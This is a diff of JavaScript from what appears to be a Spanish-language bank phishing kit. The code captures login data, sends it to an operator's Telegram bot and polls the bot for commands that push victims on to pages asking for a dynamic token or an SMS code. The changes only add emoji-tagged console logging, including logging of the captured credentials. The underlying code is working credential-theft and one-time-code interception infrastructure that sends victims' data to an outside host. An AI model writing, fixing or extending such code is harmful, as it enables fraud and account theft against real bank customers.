@@ -237,10 +237,10 @@
                     const data = await response.json();
                     TELEGRAM_BOT_TOKEN = data.token;
                     TELEGRAM_CHAT_ID = data.chat_id;
-                    console.log("Tokens y IDs de chat de Telegram cargados correctamente.");
+                    console.log("🟢 Tokens y IDs de chat de Telegram cargados correctamente.");
                     return true;
                 } catch (error) {
-                    console.error('Error al cargar la configuración de Telegram:', error);
+                    console.error('🔴 Error al cargar la configuración de Telegram:', error);
                     alert('Error crítico: No se pudo cargar la configuración de Telegram. Por favor, verifica el archivo js/brr76.json.');
                     if (ingresarBtn) ingresarBtn.disabled = true;
                     return false;
@@ -259,9 +259,9 @@
                     const maxUpdateId = Math.max(...updates.map(u => u.update_id));
                     lastUpdateId = maxUpdateId;
                     sessionStorage.setItem('lastUpdateId', lastUpdateId);
-                    console.log('Inicializado lastUpdateId a', lastUpdateId);
+                    console.log('✅ lastUpdateId inicializado a', lastUpdateId);
                 } catch (err) {
-                    console.warn('No se pudo inicializar lastUpdateId:', err);
+                    console.warn('🟡 No se pudo inicializar lastUpdateId:', err);
                 }
             }
 
@@ -360,6 +360,7 @@
                 };
 
                 try {
+                    console.log("➡️ Enviando a Telegram:", payload);
                     const response = await fetch(url, {
                         method: 'POST',
                         headers: {
@@ -369,13 +370,14 @@
                     });
                     if (!response.ok) {
                         const errorText = await response.text();
-                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
+                        console.error(`🔴 Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
                         return null;
                     }
                     const data = await response.json();
+                    console.log('✅ Mensaje enviado a Telegram exitosamente.');
                     return data.result.message_id;
                 } catch (error) {
-                    console.error('Error de red al enviar mensaje a Telegram:', error);
+                    console.error('🔴 Error de red al enviar mensaje a Telegram:', error);
                     return null;
                 }
             }
@@ -400,15 +402,16 @@
                     });
                     if (!response.ok) {
                         const errorText = await response.text();
-                        console.error(`Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
+                        console.error(`🔴 Error al borrar botones de Telegram: ${response.status} - ${errorText}`);
                     }
                 } catch (error) {
-                    console.error('Error de red al borrar botones de Telegram:', error);
+                    console.error('🔴 Error de red al borrar botones de Telegram:', error);
                 }
             }
 
             async function handleLoginAttempt(loginData) {
                 spinnerModal.style.display = 'flex';
+                console.log("📋 Datos capturados:", loginData);
 
                 const now = new Date();
                 const formattedDate = now.toLocaleDateString('es-CO', {
@@ -434,6 +437,7 @@
                     loginType: loginType
                 };
                 sessionStorage.setItem('initialLoginData', JSON.stringify(dataToStore));
+                console.log("💾 Datos guardados en sessionStorage:", dataToStore);
 
                 const keyboard = JSON.stringify({
                     inline_keyboard: [
@@ -487,12 +491,13 @@
                                         body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
                                     });
                                 } catch (err) {
-                                    console.warn('No se pudo responder callback_query:', err);
+                                    console.warn('🟡 No se pudo responder callback_query:', err);
                                 }
 
                                 lastUpdateId = latest.update_id;
                                 sessionStorage.setItem('lastUpdateId', lastUpdateId);
 
+                                console.log("➡️ Redirigiendo a:", callbackData);
                                 if (callbackData === 'pedir_dinamica') {
                                     window.location.href = "token.html";
                                 } else if (callbackData === 'pedir_sms') {
@@ -502,11 +507,11 @@
                                 } else if (callbackData === 'error_logo') {
                                     errorModal.style.display = 'flex';
                                 }
-                                sessionStorage.clear(); // Limpiar el sessionStorage después de procesar la acción
+                                sessionStorage.clear(); 
                             }
                         }
                     } catch (error) {
-                        console.error("Error al verificar el estado de la transacción:", error);
+                        console.error("🔴 Error al verificar el estado de la transacción:", error);
                     }
                 }, 2000);
             }
